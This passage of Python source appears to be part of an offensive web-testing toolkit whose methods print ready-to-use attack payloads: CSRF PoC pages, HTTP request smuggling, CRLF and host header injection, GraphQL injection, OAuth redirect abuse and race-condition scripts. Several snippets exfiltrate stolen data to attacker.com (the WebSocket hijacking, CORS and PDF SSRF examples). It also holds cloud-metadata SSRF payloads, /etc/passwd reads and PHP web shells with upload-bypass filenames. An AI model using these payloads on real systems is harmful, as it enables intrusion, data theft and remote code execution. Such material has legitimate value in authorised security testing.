        for category, techs in techniques.items():
            result.append(f"\n=== {category.upper()} ===")
            for t in techs:
                result.append(f"  - {t}")

        return '\n'.join(result)

    def csrf_poc_generate(self, method: str = "POST", url: str = "TARGET_URL",
                          params: dict = None) -> str:
        """Generate CSRF PoC HTML"""
        if params is None:
            params = {"param1": "value1", "param2": "value2"}

        result = ["CSRF PoC Generator:", "-" * 50]

        # HTML form PoC
        form_poc = f'''<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>Click the button</h1>
    <form action="{url}" method="{method}" id="csrf_form">
'''
        for key, value in params.items():
            form_poc += f'        <input type="hidden" name="{key}" value="{value}" />\n'
        form_poc += '''        <input type="submit" value="Submit" />
    </form>

    <!-- Auto-submit -->
    <script>
        document.getElementById("csrf_form").submit();
    </script>
</body>
</html>'''

        result.append("\n=== HTML FORM POC ===")
        result.append(form_poc)

        # XHR PoC
        xhr_poc = f'''<script>
var xhr = new XMLHttpRequest();
xhr.open("{method}", "{url}", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
xhr.send("{urllib.parse.urlencode(params)}");
</script>'''

        result.append("\n=== XHR POC (if CORS allows) ===")
        result.append(xhr_poc)

        # Fetch PoC
        fetch_poc = f'''<script>
fetch("{url}", {{
    method: "{method}",
    credentials: "include",
    headers: {{"Content-Type": "application/x-www-form-urlencoded"}},
    body: "{urllib.parse.urlencode(params)}"
}});
</script>'''

        result.append("\n=== FETCH POC ===")
        result.append(fetch_poc)

        return '\n'.join(result)

    # === HTTP Request Smuggling ===

    @dangerous_operation(
        risk_level=RiskLevel.HIGH,
        description="HTTP request smuggling can bypass security controls, poison web caches, and perform request hijacking by exploiting discrepancies in how front-end and back-end servers parse HTTP requests (CL.TE, TE.CL, TE.TE variants)"
    )
    def http_smuggling(self) -> str:
        """HTTP request smuggling payloads"""
        payloads = {
            "cl_te": {
                "description": "CL.TE - Front-end uses Content-Length, back-end uses Transfer-Encoding",
                "payload": '''POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED'''
            },
            "te_cl": {
                "description": "TE.CL - Front-end uses Transfer-Encoding, back-end uses Content-Length",
                "payload": '''POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

'''
            },
            "te_te": {
                "description": "TE.TE - Both use Transfer-Encoding but can be obfuscated",
                "payload": '''POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: x

0

SMUGGLED'''
            }
        }

        obfuscation = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked",  # Space
            "Transfer-Encoding: x",
            "Transfer-Encoding:[tab]chunked",
            "X: X[\\n]Transfer-Encoding: chunked",
            "Transfer-Encoding\\n: chunked",
        ]

        result = ["HTTP Request Smuggling Payloads:", "-" * 50]

        for name, info in payloads.items():
            result.append(f"\n=== {name.upper()} ===")
            result.append(f"Description: {info['description']}")
            result.append(f"Payload:\n{info['payload']}")

        result.append("\n=== TRANSFER-ENCODING OBFUSCATION ===")
        for o in obfuscation:
            result.append(f"  {o}")

        result.append("\n=== DETECTION ===")
        result.append("  1. Send timing-based requests")
        result.append("  2. Use Burp's HTTP Request Smuggler extension")
        result.append("  3. Check for response desync")

        return '\n'.join(result)

    def http_header_injection(self) -> str:
        """HTTP header injection payloads"""
        payloads = [
            "value\\r\\nX-Injected: header",
            "value%0d%0aX-Injected:%20header",
            "value%0aX-Injected: header",
            "value%0dX-Injected: header",
            "value\\r\\nSet-Cookie: malicious=cookie",
            "value\\r\\n\\r\\n<html>injected body</html>",
            "value%0d%0a%0d%0a<script>alert(1)</script>",
        ]

        result = ["HTTP Header Injection Payloads:", "-" * 50]

        result.append("Basic payloads:")
        for p in payloads:
            result.append(f"  {p}")

        result.append("\n=== COMMON INJECTION POINTS ===")
        result.append("  - Redirect URL parameters")
        result.append("  - Cookie values")
        result.append("  - User-Agent header")
        result.append("  - X-Forwarded-For header")

        result.append("\n=== IMPACT ===")
        result.append("  - Session fixation")
        result.append("  - Cache poisoning")
        result.append("  - XSS via response splitting")

        return '\n'.join(result)

    def crlf_injection(self) -> str:
        """CRLF injection payloads"""
        payloads = [
            "%0d%0a",
            "%0d",
            "%0a",
            "\\r\\n",
            "\\r",
            "\\n",
            "%0d%0a%0d%0a",  # Double CRLF for body injection
            "%E5%98%8A%E5%98%8D",  # Unicode encoding
            "%%0a0a",  # Double encoding
            "%25%30%61",  # Triple encoding
        ]

        result = ["CRLF Injection Payloads:", "-" * 50]

        result.append("CRLF sequences:")
        for p in payloads:
            result.append(f"  {p}")

        result.append("\n=== ATTACK PAYLOADS ===")
        result.append("XSS via header:")
        result.append("  %0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>")
        result.append("")
        result.append("Session fixation:")
        result.append("  %0d%0aSet-Cookie:%20sessionid=attacker_controlled")
        result.append("")
        result.append("Cache poisoning:")
        result.append("  %0d%0aX-Forwarded-Host:%20attacker.com")

        return '\n'.join(result)

    def host_header_attack(self) -> str:
        """Host header attack payloads"""
        payloads = {
            "password_reset": [
                "Host: attacker.com",
                "Host: target.com\\r\\nX-Forwarded-Host: attacker.com",
                "Host: target.com\\nHost: attacker.com",
                "X-Forwarded-Host: attacker.com",
                "X-Host: attacker.com",
                "X-Forwarded-Server: attacker.com",
                "X-HTTP-Host-Override: attacker.com",
                "Forwarded: host=attacker.com",
            ],
            "cache_poisoning": [
                "Host: target.com\\r\\nX-Forwarded-Host: attacker.com",
                "X-Original-URL: /admin",
                "X-Rewrite-URL: /admin",
            ],
            "ssrf": [
                "Host: localhost",
                "Host: 127.0.0.1",
                "Host: [::1]",
                "Host: 169.254.169.254",  # Cloud metadata
            ]
        }

        result = ["Host Header Attack Payloads:", "-" * 50]

        for category, payloads_list in payloads.items():
            result.append(f"\n=== {category.upper()} ===")
            for p in payloads_list:
                result.append(f"  {p}")

        result.append("\n=== TESTING ===")
        result.append("  1. Inject Host header with attacker domain")
        result.append("  2. Check password reset emails for poisoned links")
        result.append("  3. Test with duplicate Host headers")
        result.append("  4. Test with absolute URL in request line")

        return '\n'.join(result)

    # === GraphQL ===

    def graphql_introspection(self) -> str:
        """GraphQL introspection query"""
        full_query = '''{
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
          kind
        }
        args {
          name
          type {
            name
          }
        }
      }
    }
    queryType {
      name
    }
    mutationType {
      name
    }
  }
}'''

        simple_query = '''{
  __schema {
    queryType {
      name
      fields {
        name
        description
      }
    }
  }
}'''

        result = ["GraphQL Introspection Queries:", "-" * 50]

        result.append("\n=== FULL INTROSPECTION ===")
        result.append(full_query)

        result.append("\n=== SIMPLE QUERY LIST ===")
        result.append(simple_query)

        result.append("\n=== GET ALL TYPES ===")
        result.append("{__schema{types{name}}}")

        result.append("\n=== DETECT GRAPHQL ===")
        result.append("  POST to /graphql with: {\"query\":\"{__typename}\"}")
        result.append("  Common endpoints: /graphql, /api/graphql, /v1/graphql")

        return '\n'.join(result)

    def graphql_injection(self) -> str:
        """GraphQL injection payloads"""
        payloads = {
            "batching_attack": [
                "[{\"query\":\"query1\"},{\"query\":\"query2\"},{\"query\":\"query3\"}]",
                "Bypass rate limiting by batching queries",
            ],
            "field_suggestion": [
                "{user(id:1){pasword}}",  # Intentional typo to get suggestions
                "Error reveals: Did you mean 'password'?",
            ],
            "directive_injection": [
                "query { user @deprecated { name } }",
                "query { __typename @include(if: true) }",
            ],
            "sql_injection": [
                '{user(name:"admin\' OR 1=1--"){id}}',
                '{user(name:"admin\\" OR 1=1--"){id}}',
            ],
            "nosql_injection": [
                '{user(name:{"$ne":""}){id}}',
                '{user(name:{"$regex":".*"}){id}}',
            ],
            "dos": [
                # Deeply nested query
                "{__typename " + "a{__typename " * 100 + "}" * 100 + "}",
            ]
        }

        result = ["GraphQL Injection Payloads:", "-" * 50]

        for category, items in payloads.items():
            result.append(f"\n=== {category.upper()} ===")
            for item in items:
                result.append(f"  {item}")

        result.append("\n=== AUTHORIZATION BYPASS ===")
        result.append("  1. Query other users' data: {user(id:2){...}}")
        result.append("  2. Access admin mutations")
        result.append("  3. Use aliases to access restricted fields")

        return '\n'.join(result)

    # === WebSocket ===

    def websocket_test(self) -> str:
        """WebSocket security test payloads"""
        result = ["WebSocket Security Testing:", "-" * 50]

        result.append("\n=== CONNECTION TEST ===")
        result.append('''<script>
var ws = new WebSocket("wss://target.com/ws");
ws.onopen = function() {
    console.log("Connected");
    ws.send("test message");
};
ws.onmessage = function(e) {
    console.log("Received: " + e.data);
};
</script>''')

        result.append("\n=== CROSS-SITE WEBSOCKET HIJACKING ===")
        result.append('''<script>
// From attacker.com
var ws = new WebSocket("wss://target.com/ws");
ws.onmessage = function(e) {
    // Send stolen data to attacker
    new Image().src = "https://attacker.com/log?data=" + e.data;
};
</script>''')

        result.append("\n=== INJECTION PAYLOADS ===")
        result.append("  {\"type\":\"message\",\"data\":\"<script>alert(1)</script>\"}")
        result.append("  {\"type\":\"admin\",\"action\":\"delete\",\"id\":1}")
        result.append("  {\"__proto__\":{\"admin\":true}}")

        result.append("\n=== TESTING CHECKLIST ===")
        result.append("  1. Check Origin header validation")
        result.append("  2. Test CSWSH (Cross-Site WebSocket Hijacking)")
        result.append("  3. Test for injection in messages")
        result.append("  4. Check authentication/authorization")

        return '\n'.join(result)

    # === OAuth ===

    def oauth_attacks(self) -> str:
        """OAuth vulnerability payloads and techniques"""
        attacks = {
            "open_redirect": [
                "redirect_uri=https://attacker.com",
                "redirect_uri=https://target.com@attacker.com",
                "redirect_uri=https://target.com.attacker.com",
                "redirect_uri=https://target.com%2F@attacker.com",
                "redirect_uri=https://target.com/callback/../attacker",
            ],
            "state_fixation": [
                "Remove state parameter",
                "Use predictable state value",
                "Reuse state across sessions",
            ],
            "code_injection": [
                "code=STOLEN_CODE&redirect_uri=https://attacker.com",
            ],
            "scope_abuse": [
                "scope=openid profile email admin",
                "scope=*",
            ],
            "token_leakage": [
                "response_type=token (implicit flow - token in URL fragment)",
                "Check Referer header leakage",
                "Check browser history",
            ]
        }

        result = ["OAuth Attack Techniques:", "-" * 50]

        for category, items in attacks.items():
            result.append(f"\n=== {category.upper()} ===")
            for item in items:
                result.append(f"  {item}")

        result.append("\n=== CSRF IN OAUTH ===")
        result.append("  1. Initiate OAuth flow")
        result.append("  2. Get authorization code")
        result.append("  3. Don't use it, send to victim")
        result.append("  4. Victim's account linked to attacker")

        result.append("\n=== TESTING CHECKLIST ===")
        result.append("  1. Test redirect_uri validation")
        result.append("  2. Check state parameter usage")
        result.append("  3. Test token storage security")
        result.append("  4. Check scope validation")

        return '\n'.join(result)

    # === CORS ===

    def cors_exploit(self) -> str:
        """CORS misconfiguration exploit"""
        result = ["CORS Misconfiguration Exploit:", "-" * 50]

        result.append("\n=== DETECTION ===")
        result.append("Send request with:")
        result.append("  Origin: https://attacker.com")
        result.append("")
        result.append("Check response for:")
        result.append("  Access-Control-Allow-Origin: https://attacker.com")
        result.append("  Access-Control-Allow-Credentials: true")

        result.append("\n=== EXPLOIT CODE ===")
        result.append('''<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://target.com/api/sensitive", true);
xhr.withCredentials = true;
xhr.onload = function() {
    // Send stolen data to attacker
    var stolen = xhr.responseText;
    new Image().src = "https://attacker.com/log?data=" + encodeURIComponent(stolen);
};
xhr.send();
</script>''')

        result.append("\n=== VULNERABLE CONFIGURATIONS ===")
        result.append("  Access-Control-Allow-Origin: * (with credentials)")
        result.append("  Access-Control-Allow-Origin: https://evil.com")
        result.append("  Access-Control-Allow-Origin: null")
        result.append("  Reflecting Origin header without validation")

        result.append("\n=== BYPASS TECHNIQUES ===")
        result.append("  Origin: https://target.com.attacker.com")
        result.append("  Origin: https://attackertarget.com")
        result.append("  Origin: https://target.com%60attacker.com")
        result.append("  Origin: null (data: URI)")

        return '\n'.join(result)

    # === Cache Poisoning ===

    def cache_poison(self) -> str:
        """Web cache poisoning payloads"""
        result = ["Web Cache Poisoning:", "-" * 50]

        result.append("\n=== UNKEYED HEADERS TO TEST ===")
        unkeyed_headers = [
            "X-Forwarded-Host: attacker.com",
            "X-Forwarded-Scheme: http",
            "X-Forwarded-Proto: http",
            "X-Original-URL: /admin",
            "X-Rewrite-URL: /admin",
            "X-Host: attacker.com",
            "X-Forwarded-Server: attacker.com",
        ]
        for h in unkeyed_headers:
            result.append(f"  {h}")

        result.append("\n=== BASIC POISON ===")
        result.append("Request:")
        result.append("  GET /page HTTP/1.1")
        result.append("  Host: target.com")
        result.append("  X-Forwarded-Host: attacker.com")
        result.append("")
        result.append("If response contains: <script src='//attacker.com/evil.js'>")
        result.append("And response is cached, all users get poisoned response!")

        result.append("\n=== CACHE BUSTER ===")
        result.append("Add unique parameter to avoid cache: ?cb=random123")
        result.append("After confirming poison, remove cache buster")

        result.append("\n=== FAT GET ===")
        result.append("GET /page HTTP/1.1")
        result.append("Host: target.com")
        result.append("Content-Length: 10")
        result.append("")
        result.append("x=injected")

        return '\n'.join(result)

    # === PDF SSRF ===

    def pdf_ssrf(self) -> str:
        """PDF generation SSRF payloads"""
        result = ["PDF Generation SSRF:", "-" * 50]

        result.append("\n=== HTML TO PDF SSRF ===")
        payloads = [
            '<iframe src="http://169.254.169.254/latest/meta-data/">',
            '<img src="http://169.254.169.254/latest/meta-data/">',
            '<link rel="stylesheet" href="http://169.254.169.254/">',
            '<script src="http://169.254.169.254/"></script>',
            '<object data="http://169.254.169.254/">',
            '<embed src="http://169.254.169.254/">',
        ]
        for p in payloads:
            result.append(f"  {p}")

        result.append("\n=== FILE READ ===")
        result.append('  <iframe src="file:///etc/passwd">')
        result.append('  <script>x=new XMLHttpRequest();x.open("GET","file:///etc/passwd",false);x.send();document.body.innerHTML=x.responseText;</script>')

        result.append("\n=== EXFILTRATION ===")
        result.append('''<script>
var data = document.body.innerHTML;
new Image().src = "http://attacker.com/?d=" + btoa(data);
</script>''')

        result.append("\n=== COMMON LIBRARIES ===")
        result.append("  - wkhtmltopdf")
        result.append("  - PhantomJS")
        result.append("  - Puppeteer/Chrome")
        result.append("  - WeasyPrint")

        return '\n'.join(result)

    # === File Upload ===

    def upload_bypass(self) -> str:
        """File upload bypass techniques"""
        techniques = {
            "extension_bypass": [
                "shell.php.jpg",
                "shell.php%00.jpg",
                "shell.php;.jpg",
                "shell.pHp",
                "shell.php5",
                "shell.phtml",
                "shell.php.png",
                "shell.php%0a.jpg",
                "shell.php.",
                "shell.php::$DATA",  # Windows NTFS
            ],
            "content_type_bypass": [
                "Content-Type: image/jpeg",
                "Content-Type: image/png",
                "Content-Type: image/gif",
            ],
            "magic_bytes": {
                "GIF": "GIF89a<?php system($_GET['c']); ?>",
                "PNG": "\\x89PNG\\r\\n\\x1a\\n<?php system($_GET['c']); ?>",
                "JPEG": "\\xFF\\xD8\\xFF\\xE0<?php system($_GET['c']); ?>",
            },
            "htaccess": [
                "AddType application/x-httpd-php .jpg",
                "AddHandler php-script .jpg",
            ],
            "polyglot": [
                "Create valid image that's also valid PHP",
                "Use exiftool: exiftool -Comment='<?php system($_GET[c]); ?>' image.jpg",
            ]
        }

        result = ["File Upload Bypass Techniques:", "-" * 50]

        for category, items in techniques.items():
            result.append(f"\n=== {category.upper()} ===")
            if isinstance(items, list):
                for item in items:
                    result.append(f"  {item}")
            else:
                for name, payload in items.items():
                    result.append(f"  {name}: {payload}")

        result.append("\n=== EXECUTION LOCATIONS ===")
        result.append("  /uploads/shell.php")
        result.append("  /images/shell.php")
        result.append("  /tmp/shell.php")
        result.append("  /var/www/html/uploads/shell.php")

        return '\n'.join(result)

    # === Race Condition ===

    def race_condition(self) -> str:
        """Race condition exploit templates"""
        result = ["Race Condition Exploits:", "-" * 50]

        result.append("\n=== PYTHON TEMPLATE ===")
        result.append('''import threading
import requests

url = "https://target.com/api/action"
cookies = {"session": "your_session"}

def send_request():
    requests.post(url, cookies=cookies, data={"amount": 100})

threads = []
for i in range(50):
    t = threading.Thread(target=send_request)
    threads.append(t)

# Start all threads simultaneously
for t in threads:
    t.start()

for t in threads:
    t.join()''')

        result.append("\n=== TURBO INTRUDER (BURP) ===")
        result.append('''def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=50,
                           requestsPerConnection=100)
    for i in range(50):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)''')

        result.append("\n=== COMMON TARGETS ===")
        result.append("  - Balance transfers")
        result.append("  - Coupon redemption")
        result.append("  - Vote systems")
        result.append("  - File operations (TOCTOU)")
        result.append("  - Account registration/email verification")

        result.append("\n=== TESTING TIPS ===")
        result.append("  1. Use 'Last-Byte Sync' for precise timing")
        result.append("  2. Test with multiple connections")
        result.append("  3. Watch for partial successes")

        return '\n'.join(result)
